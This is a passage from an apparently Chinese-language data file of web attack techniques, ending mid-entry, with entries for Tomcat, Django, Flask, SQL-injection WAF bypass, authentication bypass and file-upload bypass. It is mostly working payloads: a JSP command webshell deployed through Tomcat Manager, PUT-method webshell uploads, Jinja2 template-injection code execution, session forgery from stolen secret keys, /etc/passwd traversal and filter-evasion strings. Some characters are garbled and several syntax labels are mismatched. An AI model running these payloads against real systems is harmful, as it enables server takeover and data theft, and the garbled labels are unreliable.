    id: 'tomcat-vuln',
    name: 'Apache Tomcat漏�',
    description: 'Apache Tomcat服务器漏�利用',
    category: '框架漏洞',
    subCategory: 'Tomcat',
    tags: ['tomcat', 'rce', 'java', 'manager'],
    prerequisites: ['使用Tomcat服务器', '存在漏�版本或配置'],
    execution: [
      { 
        title: '1. Manager App弱口令', 
        command: '# 访问Manager App\nhttp://target/manager/html\n\n# 常见弱口令\ntomcat:tomcat\nadmin:admin\nadmin:tomcat\n\n# 使用工具爆�\nhydra -l tomcat -P passwords.txt target http-get /manager/html', 
        description: 'Manager App弱口令', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '/manager/html', explanation: 'Tomcat管理界面' }
        ]
      },
      { 
        title: '2. 部署War包', 
        command: '# 生成恶意War包\n# cmd.jsp\n<%@ page import="java.util.*,java.io.*"%>\n<% String cmd = request.getParameter("cmd");\nProcess p = Runtime.getRuntime().exec(cmd);\nBufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));\nString line;\nwhile((line = br.readLine()) != null) { out.println(line); }\n%>\n\n# 打包\njar cvf shell.war cmd.jsp\n\n# 通过Manager上传\ncurl -u tomcat:tomcat -T shell.war "http://target/manager/deploy?path=/shell"\n\n# 访问Shell\nhttp://target/shell/cmd.jsp?cmd=id', 
        description: '部署War包', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '#', explanation: '注释标记', type: 'operator' },
          { part: 'http://target/manager/deploy?path=/shell', explanation: '目标URL', type: 'value' }
        ]
      },
      { 
        title: '3. CVE-2020-1938 Ghostcat', 
        command: '# AJP文件读取/包含\n# 使用工具\ngit clone https://github.com/chaitin/xray\ncd xray\n./xray_linux_amd64 webscan --plugins phantomjs --url http://target\n\n# 或使用专用工具\ngit clone https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi\ncd CNVD-2020-10487-Tomcat-Ajp-lfi\npython CNVD-2020-10487-Tomcat-Ajp-lfi.py -p 8009 -f /WEB-INF/web.xml target', 
        description: 'CVE-2020-1938 Ghostcat', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'AJP', explanation: 'Apache JServ Protocol' },
          { part: '8009', explanation: 'AJP默认端口' }
        ]
      },
      { 
        title: '4. PUT方法任意文件写入', 
        command: '# CVE-2017-12615\n# Windows下PUT方法写文件\nPUT /shell.jsp%20 HTTP/1.1\nHost: target\nContent-Length: 24\n\n<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>\n\n# 或使用::$DATA\nPUT /shell.jsp::$DATA HTTP/1.1\n\n# 或使用/\nPUT /shell.jsp/ HTTP/1.1', 
        description: 'PUT方法任意文件写入', 
        platform: 'windows',
        syntaxBreakdown: [
          { part: '#', explanation: '注释标记', type: 'operator' },
          { part: '%XX', explanation: 'URL编码', type: 'encoding' }
        ]
      }
    ],
    wafBypass: [
      { 
        title: '文件名绕过', 
        command: '# 不同文件名变体\nshell.jsp%20\nshell.jsp::$DATA\nshell.jsp/\nshell.jsp%00\nshell.jSp\nshell.jsP',
            syntaxBreakdown: [
              { part: '#', explanation: '命令/载荷起始', type: 'command' },
              { part: ' 不同文件名变体\nshell.jsp%20\nshell.jsp::$DATA\nshell.jsp/\nshell.jsp%00\nshell.jSp\nshell.jsP', explanation: '参数与载荷内容', type: 'value' }
            ],
        description: '文件名绕过', 
        platform: 'all'
      }
    ],
    tutorial: {
      overview: 'Apache Tomcat是最广泛使用的Java Servlet容器，常见漏洞包括AJP文件读取/包含(GhostCat)、PUT方法写文件、Manager部署WAR后门等。Tomcat的Manager应用弱口令(tomcat:tomcat)是最常见的入侵入口。',
      vulnerability: 'Tomcat高危漏洞：1)AJP协议文件读取/包含(CVE-2020-1938 GhostCat) 2)PUT方法写文件(CVE-2017-12615) 3)Manager应用弱口令部署WAR WebShell 4)Session反序列化(FileStore持久化) 5)JSP执行路径穿越(CVE-2020-9484) 6)默认页面信息泄露。',
      exploitation: '完�利用流程：\n1. 扫描Tomcat服务\n2. 尝试弱口令登录\n3. 部署恶意War包\n4. 或利用其他CVE漏�',
      mitigation: '防御措施：\n1. 修改默认口令\n2. 限制Manager访问\n3. 禁用AJP或配置secret\n4. 升级Tomcat版本',
      difficulty: 'intermediate'
    }
  },
  {
    id: 'django-vuln',
    name: 'Django框架漏�',
    description: 'Django框架安全漏�',
    category: '框架漏洞',
    subCategory: 'Django',
    tags: ['django', 'python', 'framework', 'sql'],
    prerequisites: ['使用Django框架', '存在漏�版本'],
    execution: [
      { 
        title: '1. SQL注入', 
        command: '# CVE-2020-7471\n# 通过PostgreSQL输入验证绕过\n# 使用JSONField/HStoreField\n\n# 构造恶意查询\nModel.objects.filter(data__contains={"key": "value; DROP TABLE users;--"})\n\n# 或使用ArrayField\nModel.objects.filter(tags__contains=["tag\'); DROP TABLE users;--"])\n\n# 触发SQL注入', 
        description: 'CVE-2020-7471 SQL注入', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'JSONField', explanation: 'Django JSON字段' },
          { part: '__contains', explanation: 'Django查询语法' }
        ]
      },
      { 
        title: '2. 调试模式信息泄露', 
        command: '# DEBUG=True时\n# 错误页面泄露:\n- 源代码\n- 环境变量\n- 数据库配置\n- SECRET_KEY\n- 服务器路径\n\n# 访问不存在的页面触发错误\nhttp://target/nonexistent\n\n# 或触发异常', 
        description: '调试模式信息泄露', 
        platform: 'all'
      },
      { 
        title: '3. SECRET_KEY利用', 
        command: '# 获取SECRET_KEY后\n# 可以:\n# 1. 签名伪造Session\n# 2. 签名伪造CSRF Token\n# 3. 密码重置Token\n\n# 使用django-session-cleanup工具\n# 或手动解签\n\nimport django.core.signing as signing\n\n# 解签Session\nsigning.loads(session_value, key=SECRET_KEY)\n\n# 签名伪造Session\nfake_session = signing.dumps({"user_id": 1}, key=SECRET_KEY)', 
        description: 'SECRET_KEY利用', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '#', explanation: '注释标记', type: 'operator' },
          { part: '# 获取SECRET_KEY后\n# 可以:\n# 1. 签', explanation: '利用载荷', type: 'value' }
        ]
      },
      { 
        title: '4. 路径遍历', 
        command: '# CVE-2021-28658\n# Django静态文件路径遍历\nGET /static/../../../../etc/passwd\n\n# 使用工具检测\ncurl http://target/static/../../../../etc/passwd', 
        description: '路径遍历漏�', 
        syntaxBreakdown: [
          { part: '#', explanation: '注释标记', type: 'operator' },
          { part: 'http://target/static/../../../../etc/passwd', explanation: '目标URL', type: 'value' }
        ]
        },
      ],
    wafBypass: [
      { 
        title: '编码绕过', 
        command: '# URL编码\n/static/%2e%2e/%2e%2e/etc/passwd\n\n# 双重编码\n/static/%252e%252e/%252e%252e/etc/passwd\n\n# Unicode编码\n/static/..%c0%af..%c0%af/etc/passwd',
            syntaxBreakdown: [
              { part: '#', explanation: '命令/载荷起始', type: 'command' },
              { part: ' URL编码\n/static/%2e%2e/%2e%2e/etc/passwd\n\n# 双重编码\n/static/%252e%252e/%252e%252e/etc/passwd\n\n# Unicode编码\n/static/..%c0%af..%c0%af/etc/passwd', explanation: '参数与载荷内容', type: 'value' }
            ],
        description: '编码绕过', 
        platform: 'all'
      }
    ],
    tutorial: {
      overview: 'Django是Python最成熟的Web框架，安全机制完善但仍存在漏洞：SQL注入(JSONField/Raw SQL)、Debug模式信息泄露、CSRF Token绕过、模板注入(自定义标签)等。Django的安全响应团队会及时发布安全更新。',
      vulnerability: 'Django漏洞：1)Debug模式(DEBU=True)泄露完整配置、数据库信息、源代码路径 2)JSONField/HStoreField SQL注入(CVE-2019-14234) 3)Truncation攻击(邮件地址截断绕过) 4)StringAgg SQL注入 5)URL验证绕过(is_valid_url) 6)密码重置Token预测。',
      exploitation: '完�利用流程：\n1. 检测Django版本\n2. 利用调试模式获取信息\n3. 利用SQL注入\n4. 或利用SECRET_KEY伪造身份',
      mitigation: '防御措施：\n1. 关闭调试模式\n2. 升级Django版本\n3. 保护SECRET_KEY\n4. 输入验证',
      difficulty: 'intermediate'
    }
  },
  {
    id: 'flask-vuln',
    name: 'Flask框架漏�',
    description: 'Flask框架安全漏�',
    category: '框架漏洞',
    subCategory: 'Flask',
    tags: ['flask', 'python', 'framework', 'ssti'],
    prerequisites: ['使用Flask框架', '存在漏�配置'],
    execution: [
      { 
        title: '1. SSTI模板注入', 
        command: '# Jinja2模板注入探测\n{{7*7}}\n${7*7}\n<%= 7*7 %>\n\n# 如果返回49则存在SSTI\n\n# 获取配置\n{{config}}\n{{self.__class__}}\n\n# 命令执行\n{{\'\'.__class__.__mro__[2].__subclasses__()[40](\'/etc/passwd\').read()}}\n{{config.__class__.__init__.__globals__[\'os\'].popen(\'id\').read()}}', 
        description: 'SSTI模板注入', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '{{...}}', explanation: 'Jinja2模板语法' },
          { part: '__class__', explanation: '获取对象类' },
          { part: '__mro__', explanation: '方法解析顺序' }
        ]
      },
      { 
        title: '2. SECRET_KEY利用', 
        command: '# Flask Session签名\n# 获取SECRET_KEY后可以伪造Session\n\n# 解签Session\nfrom flask.sessions import SecureCookieSessionInterface\nfrom itsdangerous import URLSafeTimedSerializer\n\n# 解签\ndef decode_session(cookie_value, secret_key):\n    serializer = URLSafeTimedSerializer(secret_key)\n    return serializer.loads(cookie_value)\n\n# 签名伪造\ndef encode_session(data, secret_key):\n    serializer = URLSafeTimedSerializer(secret_key)\n    return serializer.dumps(data)\n\n# 伪造管理员Session\nfake_session = encode_session({"user_id": 1, "is_admin": True}, SECRET_KEY)', 
        description: 'SECRET_KEY利用', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '#', explanation: '注释标记', type: 'operator' },
          { part: '# Flask Session签名\n# 获取SECRET_', explanation: '利用载荷', type: 'value' }
        ]
      },
      { 
        title: '3. 调试模式RCE', 
        command: '# Flask Debug模式\n# 访问/debug或/console\n# 可以执行任意Python代码\n\n# Werkzeug Debug Console\n# 访问:\nhttp://target/console\n\n# 执行代码\nimport os; os.system(\'id\')\n__import__(\'os\').system(\'id\')', 
        description: '调试模式RCE', 
        platform: 'all'
      },
      { 
        title: '4. PIN码绕过', 
        command: '# Flask Debug PIN\n# 需要获取:\n# 1. 用户名\n# 2. modname\n# 3. app路径\n# 4. MAC地址\n\n# 读取信息\n{{\'\'.__class__.__mro__[1].__subclasses__()[40](\'/etc/passwd\').read()}}\n{{config.__class__.__init__.__globals__[\'os\'].environ}}\n\n# 计算PIN\n# 使用脚本计算Werkzeug PIN', 
        description: 'PIN码绕过', 
        syntaxBreakdown: [
          { part: '{{}}', explanation: '模板表达式', type: 'technique' },
          { part: '__class__', explanation: 'Python类属性', type: 'keyword' },
          { part: '__mro__', explanation: '方法解析顺序', type: 'keyword' },
          { part: '__subclasses__()', explanation: '获取子类列表', type: 'function' }
        ]
        },
      ],
    wafBypass: [
      { 
        title: 'SSTI绕过', 
        command: '# 过滤绕过\n# 使用attr\n{{\'\'|attr(\'__class__\')|attr(\'__mro__\')}}\n\n# 使用request\n{{request|attr(\'application\')|attr(\'__globals__\')}}\n\n# 使用字符串拼接\n{{\'__cla\'~\'ss__\'}}\n\n# 使用编码\n{{\'\'[\'\\x5f\\x5fclass\\x5f\\x5f\']}}',
        description: 'SSTI绕过', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '{{}}', explanation: '模板表达式', type: 'technique' },
          { part: '__class__', explanation: 'Python类属性', type: 'keyword' },
          { part: '__mro__', explanation: '方法解析顺序', type: 'keyword' }
        ]
      }
    ],
    tutorial: {
      overview: 'Flask是Python的轻量级Web框架，其安全漏洞主要来自开发者的不安全实践：Secret Key泄露导致Session伪造、Jinja2 SSTI、Debug模式RCE(Werkzeug调试器)、以及不安全的反序列化配置。',
      vulnerability: 'Flask安全风险：1)Debug模式下Werkzeug调试器可执行任意Python代码(需PIN码，但PIN可通过文件读取计算) 2)Secret Key泄露导致Session Cookie伪造 3)Jinja2模板注入(render_template_string) 4)不安全的pickle Session序列化。',
      exploitation: '完�利用流程：\n1. 检测Flask框架\n2. 测试SSTI注入\n3. 利用调试模式\n4. 或伪造Session',
      mitigation: '防御措施：\n1. 关闭调试模式\n2. 保护SECRET_KEY\n3. 过滤模板注入\n4. 输入验证',
      difficulty: 'intermediate'
    }
  },
  {
    id: 'sqli-waf-bypass',
    name: 'SQL注入WAF绕过',
    description: '绕过Web应用防火墙的技术',
    category: 'SQL/NoSQL注入',
    subCategory: 'WAF绕过',
    tags: ['sqli', 'waf', 'bypass'],
    prerequisites: ['目标存在SQL注入点', '存在WAF防护'],
    execution: [
      { 
        title: '分块传输编码', 
        command: 'Transfer-Encoding: chunked\n\n2\nid\n1\n=\n1\n1\n\n0', 
        description: '利用分块传输绕过WAF检测', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'Transfer-Encoding:', explanation: '关键参数', type: 'value' },
          { part: 'chunked\n\n2\nid\n1\n', explanation: '关键参数', type: 'value' },
          { part: '\n1\n1\n\n0', explanation: '关键参数', type: 'value' }
        ]
      },
      { 
        title: 'HTTP参数污染(HPP)', 
        command: '?id=1&id=UNION&id=SELECT&id=1,2,3--', 
        description: '利用HPP拆分恶意Payload', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'id', explanation: '关键参数', type: 'value' },
          { part: 'id', explanation: '关键参数', type: 'value' },
          { part: 'UNION', explanation: '关键参数', type: 'value' }
        ]
      },
      { 
        title: '等价函数替换', 
        command: "' AND GREATEST(1,0)--", 
        description: '使用GREATEST替代>符号', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'AND', explanation: '关键参数', type: 'value' },
          { part: 'GREATEST(1,0)--', explanation: '关键参数', type: 'value' }
        ]
      },
      { 
        title: '无逗号注入', 
        command: "' UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c--", 
        description: '不使用逗号进行联合查询', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'UNION', explanation: '合并查询结果集', type: 'keyword' },
          { part: 'SELECT', explanation: '查询数据', type: 'keyword' },
          { part: '--', explanation: 'SQL单行注释', type: 'operator' }
        ]
      },
      { 
        title: 'IBM/Oracle特有', 
        command: "' UNION SELECT CAST(1 AS VARCHAR(10)) FROM dual--", 
        description: '利用特定数据库特性绕过通用规则', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'UNION', explanation: '合并查询结果集', type: 'keyword' },
          { part: 'SELECT', explanation: '查询数据', type: 'keyword' },
          { part: 'FROM dual', explanation: '指定数据表', type: 'value' },
          { part: '--', explanation: 'SQL单行注释', type: 'operator' }
        ]
      },
      { 
        title: '垃圾数据填充', 
        command: '/* !50000AAAAAAAAAA...(1000+字节垃圾数据)...*/ UNION SELECT 1,2,3--', 
        description: '超长数据溢出WAF缓冲区 (示意代码)', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '/*', explanation: '关键参数', type: 'value' },
          { part: '!50000AAAAAAAAAA...(1000+字节垃圾数据)...*/', explanation: '关键参数', type: 'value' },
          { part: 'UNION', explanation: '关键参数', type: 'value' }
        ]
      },
      { 
        title: 'Content-Type欺骗', 
        command: 'Content-Type: multipart/form-data; boundary=----WebKitFormBoundary\n\n------WebKitFormBoundary\nContent-Disposition: form-data; name="id"\n\n1 UNION SELECT 1,2,3--\n------WebKitFormBoundary--', 
        description: '利用multipart绕过检测', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'Content-Type:', explanation: '关键参数', type: 'value' },
          { part: 'multipart/form-data;', explanation: '关键参数', type: 'value' },
          { part: 'boundary', explanation: '关键参数', type: 'value' }
        ]
      },
      { 
        title: 'JSON注入', 
        command: '{"id": "1\' UNION SELECT 1,2,3--"}', 
        description: '在JSON数据中注入', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '{"id": "1\\' UNION SELECT 1,2,3', explanation: '利用载荷', type: 'value' },
          { part: '{"id":', explanation: '关键参数', type: 'value' },
          { part: '"1\\'', explanation: '关键参数', type: 'value' },
          { part: 'UNION', explanation: '关键参数', type: 'value' }
        ]
      }
    ],
    tutorial: {
      overview: 'SQL注入WAF绕过技术是针对Web应用防火墙防护的高级注入手法，通过编码混淆、分块传输、内联注释、大小写变换、等价函数替换等方式规避WAF的规则匹配引擎，在存在WAF防护的环境中依然实现数据库信息提取与权限获取',
      vulnerability: 'WAF通常采用正则匹配和关键字检测来拦截SQL注入，但其规则库无法覆盖所有编码变体和语法变形。攻击者利用数据库引擎与WAF解析器之间的差异，构造WAF无法识别但数据库能正常执行的恶意语句',
      exploitation: '首先识别WAF类型和版本（通过响应头、拦截页面特征），然后逐步测试各种绕过手法：URL双重编码、Unicode编码、内联注释拆分关键字(如/!50000SELECT/)、等价函数替换(如MID替代SUBSTR)、HTTP参数污染、分块传输编码等，找到可绕过的payload后提取数据',
      mitigation: '部署参数化查询从根本上杜绝SQL注入，WAF仅作为纵深防御层；定期更新WAF规则库；启用WAF的深度解码功能（递归URL解码、Unicode解码）；对异常请求实施速率限制和行为分析；结合RASP技术在运行时检测SQL注入行为',
      difficulty: 'advanced'
    }
  },
  {
    id: 'auth-bypass',
    name: '认证绕过',
    description: 'Web应用认证绕过技术',
    category: '认证漏洞',
    subCategory: '认证绕过',
    tags: ['auth', 'bypass', 'authentication'],
    prerequisites: ['目标存在认证机制', '认证实现存在缺陷'],
    execution: [
      {
        title: 'SQL注入绕过',
        command: `admin'--
admin' OR '1'='1`,
        description: 'SQL注入绕过登录',
        platform: 'all',
        syntaxBreakdown: [
          { part: 'admin\'--', explanation: '利用载荷', type: 'value' },
          { part: 'admin\'--', explanation: '关键参数', type: 'value' }
        ]
      },
      {
        title: '数组绕过',
        command: `user[]=admin&pass[]=admin`,
        description: 'PHP数组绕过',
        platform: 'all',
        syntaxBreakdown: [
          { part: '[]', explanation: '传入数组绕过类型检查', type: 'technique' },
        ]
      },
      {
        title: '类型转换',
        command: `# PHP类型转换绕过 - 数组与类型混淆:
# 1. 数组绕过密码比较(strcmp绕过):
POST /login HTTP/1.1
Content-Type: application/x-www-form-urlencoded

user=admin&pass[]=1
# strcmp(array, string) 在PHP中返回NULL，NULL == 0 为true

# 2. 松散比较绕过:
POST /login HTTP/1.1
Content-Type: application/json

{"user":"admin","pass":true}
# true == "any_string" 在PHP松散比较中为true

# 3. 数字型字符串绕过:
{"user":"admin","pass":0}
# 0 == "password_string" 在PHP中为true(PHP < 8.0)`,
        description: '类型转换绕过',
        platform: 'all',
        syntaxBreakdown: [
          { part: 'pass[]=1', explanation: '弱类型比较绕过', type: 'technique' },
        ]
      },
      {
        title: 'JSON绕过',
        command: `{"user":"admin","pass":{"$ne":""}}`,
        description: 'NoSQL绕过',
        platform: 'all',
        syntaxBreakdown: [
          { part: '$ne', explanation: 'MongoDB不等于操作符', type: 'operator' },
        ]
      },
      {
        title: 'IP伪造',
        command: `X-Forwarded-For: 127.0.0.1
X-Original-URL: /admin`,
        description: 'IP伪造绕过',
        platform: 'all',
        syntaxBreakdown: [
          { part: 'X-Forwarded-For', explanation: '伪造来源IP', type: 'header' },
        ]
      },
      {
        title: 'HTTP方法',
        command: `# HTTP方法篡改绕过认证:
# 1. 尝试不同HTTP方法:
curl -X POST "http://target.com/admin" -v
curl -X PUT "http://target.com/admin" -v
curl -X PATCH "http://target.com/admin" -v
curl -X DELETE "http://target.com/admin" -v
curl -X OPTIONS "http://target.com/admin" -v

# 2. 方法覆盖头:
curl -X POST -H "X-HTTP-Method-Override: PUT" "http://target.com/admin"
curl -X POST -H "X-Method-Override: DELETE" "http://target.com/admin"

# 3. URL路径穿越绕过:
curl "http://target.com/admin/..;/admin"
curl "http://target.com/;/admin"
curl "http://target.com/%2e%2e/admin"`,
        description: 'HTTP方法绕过',
        platform: 'all',
        syntaxBreakdown: [
          { part: 'PUT', explanation: '使用非GET/POST方法', type: 'method' },
        ]
      },
    ],
    wafBypass: [
      {
        title: 'HTTP方法篡改与路径规范化',
        command: `# HTTP方法篡改:
GET /admin HTTP/1.1 → 403
POST /admin HTTP/1.1 → 200
PATCH /admin HTTP/1.1
OPTIONS /admin HTTP/1.1
X-HTTP-Method: PUT
X-HTTP-Method-Override: DELETE

# 路径规范化:
/admin → 403
/ADMIN → 200
/admin/ → 200
//admin → 200
/./admin → 200
/admin..;/ → 200
/%61dmin → 200`,
            syntaxBreakdown: [
              { part: '# HTTP方法篡改:\nGET /admin HTTP/1.1 → 403\nPOST /admin HTTP/1.1 → 200\nPATCH /admin HTTP/1.1\nOPTIONS /admin HTTP/1.1\nX-HTTP-Method: PUT\nX-HTTP-Method-Override: ', explanation: 'SQL表达式', type: 'value' },
              { part: 'DELETE', explanation: 'SQL关键字', type: 'keyword' },
              { part: '\n\n# 路径规范化:\n/admin → 403\n/ADMIN → 200\n/admin/ → 200\n//admin → 200\n/./admin → 200\n/admin..;/ → 200\n/%61dmin → 200', explanation: 'SQL表达式', type: 'value' }
            ],
        description: '使用非标准HTTP方法或方法覆盖头绕过基于方法的访问控制，利用URL路径大小写、双斜杠、点号、编码等规范化差异绕过路径匹配',
      },
      {
        title: 'HTTP/2伪头与请求拆分',
        command: `# HTTP/2伪头绕过:
:method: GET
:path: /admin
:authority: target.com
X-Original-URL: /admin
X-Rewrite-URL: /admin

# Header注入:
Host: target.com
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Custom-IP-Authorization: 127.0.0.1
X-Forwarded-Host: localhost`,
            syntaxBreakdown: [
              { part: '# HTTP/2伪头绕过:', explanation: '主要命令', type: 'command' },
              { part: '...', explanation: '共13行', type: 'value' }
            ],
        description: '利用HTTP/2伪头部(:path等)或X-Original-URL/X-Rewrite-URL头覆盖请求路径绕过反向代理ACL，通过IP伪造头绕过基于来源的认证',
      },
    ],
    tutorial: {
      overview: '认证绕过漏洞涵盖多种跳过身份验证机制的攻击手法，包括默认凭证利用、认证逻辑缺陷、会话固定、响应篡改、强制浏览等，直接获取未经授权的系统访问权限，是Web应用中最常见的高危漏洞类型之一',
      vulnerability: '认证机制实现缺陷包括：硬编码默认凭证未强制修改、认证状态仅依赖客户端参数判断、密码重置流程存在逻辑漏洞、会话令牌生成算法可预测、多步认证流程可跳步、OAuth/SAML实现不当导致身份伪造等',
      exploitation: '首先枚举目标应用的认证端点和流程，测试默认凭证(admin/admin等)，分析认证请求响应中的状态码和参数，尝试修改响应中的认证标志(如将false改为true)，测试直接访问认证后页面(强制浏览)，检查JWT令牌签名验证是否严格，测试并发登录和条件竞争',
      mitigation: '实施多因素认证(MFA)机制；禁用所有默认凭证并强制首次登录修改密码；认证状态判断必须在服务端完成；使用加密安全的随机数生成会话令牌；对所有认证后资源实施服务端访问控制校验；实施账号锁定和异常登录告警机制',
      difficulty: 'intermediate'
    }
  },
  {
    id: 'file-upload-bypass',
    name: '文件上传绕过',
    description: '文件上传限制绕过技术',
    category: '文件漏洞',
    subCategory: '文件上传',
    tags: ['upload', 'bypass', 'webshell'],
    prerequisites: ['目标存在文件上传功能', '存在上传限制'],
    execution: [
      {
        title: '扩展名绕过',
        command: `shell.php.jpg
shell.php%00.jpg
shell.phtml
shell.php5
shell.phar
shell.PhP`,
        description: '扩展名绕过(含大小写、双后缀)',
        platform: 'all',
        syntaxBreakdown: [
          { part: '.phtml', explanation: 'PHP别名扩展', type: 'value' },
          { part: '%00', explanation: '截断字符', type: 'encoding' },
          { part: '.PhP', explanation: '大小写混淆', type: 'value' },
        ]
      },
      {
        title: 'Content-Type',
        command: `Content-Type: image/jpeg
Content-Type: image/png`,
        description: '修改Content-Type',
        platform: 'all',
        syntaxBreakdown: [
          { part: 'image/jpeg', explanation: '允许的MIME类型', type: 'header' },
        ]
      },
      {
        title: '图片马',
        command: `copy normal.jpg/b + shell.php/a webshell.jpg`,
        description: '图片马制作',
        platform: 'windows',
        syntaxBreakdown: [
          { part: '/b', explanation: '二进制模式', type: 'parameter' },
        ]
      },
      {
        title: '空格绕过',
        command: `# 空格/空字符绕过后缀检测:
# 1. 文件名末尾加空格(Windows特性，保存时自动去除):
filename="shell.php "

# 2. %20编码空格:
Content-Disposition: form-data; name="file"; filename="shell.php%20"

# 3. 空字节截断(PHP<5.3.4):
filename="shell.php%00.jpg"
filename="shell.php\x00.jpg"

# 4. 制表符注入:
filename="shell.php%09.jpg"

# Burp中操作: 拦截上传请求 → 在filename中的.php后手动添加空格/空字节`,
        description: '文件名末尾空格',
        platform: 'windows',
        syntaxBreakdown: [
          { part: ' ', explanation: 'Windows特性自动去空格', type: 'technique' },
        ]
      },
      {
        title: '点号绕过',
        command: `# 点号/特殊字符绕过:
# 1. 末尾加点(Windows会自动去除末尾的点):
filename="shell.php."
filename="shell.php..."

# 2. 点+空格组合:
filename="shell.php. "
filename="shell.php .jpg"

# 3. 分号截断(IIS 6.0):
filename="shell.asp;.jpg"
filename="test.asp;x.jpg"

# 4. ::概念(不执行，仅说明)
# Windows NTFS流: shell.php::DATA_STREAM

# 5. 换行符注入:
filename="shell.ph\np"

# 测试: 上传后访问URL，确认文件是否被当作PHP解析
curl "http://target.com/uploads/shell.php." -v`,
        description: '文件名末尾点号',
        platform: 'windows',
        syntaxBreakdown: [
          { part: '.', explanation: 'Windows特性自动去点号', type: 'technique' },
        ]
      },
      {
        title: 'NTFS流',
        command: `# Windows NTFS备用数据流绕过:
# 1. 标准NTFS ADS绕过:
filename="shell.php::DATA"
# Windows会自动忽略::DATA后缀，文件保存为shell.php

# 2. 其他ADS变体:
filename="shell.php::INDEX_ALLOCATION"
filename="shell.php:evil.php"
filename="shell.php:evil.txt:DATA"

# 3. 在Burp中操作:
# 拦截上传请求
# 修改filename为: shell.php::DATA
# 发送请求

# 4. 验证文件是否上传:
curl "http://target.com/uploads/shell.php" -v
curl "http://target.com/uploads/shell.php::DATA" -v

# 注意: 仅在Windows(IIS/NTFS)环境有效，Linux无此特性`,
        description: 'NTFS ADS绕过',
        platform: 'windows',
        syntaxBreakdown: [
          { part: '::$DATA', explanation: 'NTFS数据流标识', type: 'technique' },
        ]
      },
      {
        title: '双写绕过',
        command: `# 双写后缀绕过(当服务器仅删除一次敏感后缀时):
# 1. PHP双写:
filename="shell.pphphp"    # 删除php后剩余shell.php
filename="shell.pHPhp"     # 大小写混合双写
filename="shell.phphpp"    # 不同位置双写

# 2. ASP双写:
filename="shell.asaspp"    # 删除asp后剩余shell.asp
filename="shell.aaspsp"

# 3. JSP双写:
filename="shell.jjspsp"

# 4. 多层嵌套:
filename="shell.phpphpphp" # 两次删除后仍为.php

# 5. 结合大小写:
filename="shell.PhPhPp"

# 验证: 上传后确认服务器保存的实际文件名
curl -I "http://target.com/uploads/shell.php"`,
        description: '双写扩展名',
        platform: 'all',
        syntaxBreakdown: [
          { part: 'pphphp', explanation: '去除php后剩余php', type: 'technique' },
        ]
      },
    ],
    wafBypass: [
      {
        title: '双扩展名与NTFS数据流绕过',
        command: `# 双扩展名:
shell.php.jpg
shell.jpg.php
shell.php.test
shell.php%00.jpg

# NTFS备用数据流(Windows):
shell.php::$DATA
shell.php::$DATA.jpg
shell.asp;.jpg

# 特殊字符:
shell.php%20
shell.php.
shell.php....
shell.php\x00.jpg`,
            syntaxBreakdown: [
              { part: '# 双扩展名:', explanation: '主要命令', type: 'command' },
              { part: '...', explanation: '共14行', type: 'value' }
            ],
        description: '利用双扩展名欺骗文件类型检测，Windows NTFS备用数据流(::$DATA)绕过扩展名检查，特殊字符(空格、点号、空字节)截断文件名',
      },
      {
        title: 'Content-Disposition操纵与分块上传',
        command: `# Content-Disposition字段名包裹绕过:
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Disposition: form-data; name="file"; filename*=UTF-8''shell.php
Content-Disposition: form-data; name="file"; filename="shell.p\x68p"

# 分块传输编码:
Transfer-Encoding: chunked

# PHP Wrapper上传:
zip://uploads/avatar.jpg%23shell
phar://uploads/avatar.jpg/shell.php

# 竞态条件:
# 上传后立即在文件被删除前访问`,
            syntaxBreakdown: [
              { part: '# Content-Disposition字段名包裹绕过:', explanation: '主要命令', type: 'command' },
              { part: '...', explanation: '共11行', type: 'value' }
            ],
        description: '通过Content-Disposition头的filename编码变体、分块传输编码(Chunked)绕过WAF流检测，利用PHP包装器协议访问压缩包内的恶意文件',
      },
    ],
    tutorial: {
      overview: '文件上传绕过技术针对Web应用的文件上传防护机制，通过修改文件扩展名、MIME类型篡改、内容类型混淆、双扩展名、截断字符、图片马等方式绕过白名单/黑名单检测，最终上传可执行的恶意文件(如Webshell)获取服务器控制权',
      vulnerability: '文件上传验证机制的缺陷包括：仅依赖客户端JavaScript校验、仅检查Content-Type头而不验证实际内容、黑名单不完整(遗漏php5/phtml/phar等变体)、未对上传文件进行重命名和隔离存储、上传目录有脚本执行权限、未检测文件头魔术字节、解析漏洞导致非标准扩展名被执行',
      exploitation: '首先测试正常上传流程确认允许的文件类型，然后依次尝试：修改Content-Type为image/jpeg、使用双扩展名(test.php.jpg)、添加空字节截断(test.php%00.jpg)、利用Windows特性(test.php::$DATA)、大小写变体(test.PhP)、.htaccess覆盖、图片马(在合法图片末尾追加PHP代码)等，上传成功后验证文件是否可被解析执行',
      mitigation: '服务端严格校验文件类型(检查文件头魔术字节而非扩展名)；对上传文件进行重命名(使用UUID)；上传目录禁止脚本执行权限；文件存储与Web根目录隔离；使用独立的文件服务域名；对图片文件进行二次渲染以去除嵌入代码；限制上传文件大小和频率',
      difficulty: 'intermediate'
    }
  },
  {
    id: 'cache-poisoning',
    name: '缓存投毒',
    description: 'Web缓存投毒攻击',
    category: '缓存与CDN安全',
    subCategory: '缓存投毒',
    tags: ['cache', 'poisoning', 'web-cache'],
    prerequisites: ['目标使用缓存', '缓存键配置不当'],
    execution: [
      {
        title: '探测缓存',
        command: `响应头: X-Cache: hit/miss`,
        description: '探测缓存状态',
        platform: 'all',
        syntaxBreakdown: [
